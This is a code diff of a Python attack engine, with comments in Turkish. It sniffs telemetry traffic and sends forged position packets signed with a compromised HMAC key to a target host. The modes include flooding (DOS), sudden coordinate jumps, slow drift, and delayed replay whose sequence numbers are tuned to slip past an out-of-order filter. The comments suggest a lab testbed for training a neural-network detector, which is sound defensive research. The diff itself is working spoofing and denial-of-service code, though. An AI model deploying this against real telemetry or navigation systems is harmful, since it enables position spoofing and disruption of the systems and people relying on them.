@@ -40,8 +40,10 @@ def sniffer_thread():
     print(f"[*] Sniffer aktif. '{IFACE}' uzerinde trafik izleniyor...")
     sniff(iface=IFACE, filter=BPF_FILTER, prn=parse_intercepted_packet, store=0)
 
-def generate_signed_packet(seq, lat, lon, alt):
-    payload = struct.pack('!Idfff', int(seq), time.time(), lat, lon, alt)
+def generate_signed_packet(seq, lat, lon, alt, ts=None):
+    if ts is None:
+        ts = time.time() 
+    payload = struct.pack('!Idfff', int(seq), ts, lat, lon, alt)
     signature = hmac.new(COMPROMISED_KEY, payload, hashlib.sha256).digest()
     return payload + signature
 
@@ -64,7 +66,7 @@ def attack_engine():
             
         elif mode == "DOS":
             #cok hizli sahte paket gonderimi
-            garbage = generate_signed_packet(9999, 0, 0, 0)
+            garbage = generate_signed_packet(0, 0, 0, 0)
             for _ in range(500): 
                 sock.sendto(garbage, (TARGET_IP, TARGET_PORT))
             time.sleep(0.1) #ag tamamen kitlenmesin diye 
@@ -80,33 +82,46 @@ def attack_engine():
                 fake_lat = last_sniffed_payload['lat'] + lat_jump
                 fake_lon = last_sniffed_payload['lon'] + lon_jump
                 
-                pkt = generate_signed_packet(last_sniffed_payload['seq'] + 10, fake_lat, fake_lon, fake_alt)
+                seq_offset = random.randint(1, 12)
+                pkt = generate_signed_packet(last_sniffed_payload['seq'] + seq_offset, fake_lat, fake_lon, fake_alt)
                 sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
             time.sleep(1)
             
         elif mode == "DRIFT":
-            #mikro-sapma: her saniye milimetrik ama rastgele degisen artis 
+           #mikro-sapma: her saniye milimetrik ama surekli artan kayma
             if last_sniffed_payload:
-                drift_increment += random.uniform(0.005, 0.020) 
-                
+                drift_increment += random.uniform(0.005, 0.020)
+ 
                 fake_lat = last_sniffed_payload['lat'] + drift_increment
-                fake_lon = last_sniffed_payload['lon'] + (drift_increment * random.choice([-1, 1])) 
-                
-                pkt = generate_signed_packet(last_sniffed_payload['seq'] + 1, fake_lat, fake_lon, last_sniffed_payload['alt'])
+                fake_lon = last_sniffed_payload['lon'] + (drift_increment * random.choice([-1, 1]))
+ 
+                pkt = generate_signed_packet(
+                    last_sniffed_payload['seq'] + 1,
+                    fake_lat, fake_lon, last_sniffed_payload['alt']
+                )
                 sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
             time.sleep(1)
             
         elif mode == "JITTER":
-            #gercek veriyi alir ama rastgele gecikmelerle yollar 
+            #gercek veriyi alir ama rastgele gecikmelerle yollar
             if last_sniffed_payload:
                 jitter_delay = random.uniform(0.2, 3.0)
-                time.sleep(jitter_delay) 
-              
-                #biz beklerken makine1 yeni paketler yollar ve makine2'nin seq sayaci artar, paketin outoforder filtresinden gecebilmesi ve ysa'ya ulasabilmesi icin
-                #seq numarasi bekledigimiz saniye ile orantili olarak ileri alindi
-                fake_seq = last_sniffed_payload['seq'] + int(jitter_delay) + 2 
-                
-                pkt = generate_signed_packet(fake_seq, last_sniffed_payload['lat'], last_sniffed_payload['lon'], last_sniffed_payload['alt'])
+                time.sleep(jitter_delay)
+ 
+                #biz beklerken makine1 yeni paketler yollar ve makine2'nin seq sayaci artar
+                #paketin out-of-order filtresinden gecebilmesi icin seq ileri alindi
+                seq_buffer = random.randint(2, 7)
+                fake_seq = last_sniffed_payload['seq'] + int(jitter_delay) + seq_buffer
+ 
+                #orijinal timestamp korunuyor: makine2'de hesaplanan delta yukselecek,
+                #ysa jitter'i bu yukselis uzerinden tespit edecek
+                pkt = generate_signed_packet(
+                    fake_seq,
+                    last_sniffed_payload['lat'],
+                    last_sniffed_payload['lon'],
+                    last_sniffed_payload['alt'],
+                    ts=last_sniffed_payload['ts'] #orijinal timestamp
+                )
                 sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
                 
         elif mode == "OUT_OF_ORDER":
